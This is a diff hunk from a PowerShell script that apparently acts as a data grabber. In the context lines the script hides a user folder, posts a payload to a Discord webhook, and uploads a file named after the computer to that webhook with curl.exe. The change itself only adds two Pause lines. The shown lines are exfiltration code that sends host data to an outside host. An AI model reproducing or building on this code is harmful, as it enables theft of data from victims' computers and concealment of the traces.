@@ -61,8 +61,9 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 
 ## Sends Discord Webhook
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
+Pause
 curl.exe -F "file1=@./$env:computername.fk" $Webhook
-
+Pause
 
 ## goto Temp and make dir
 Set-Location $temp	
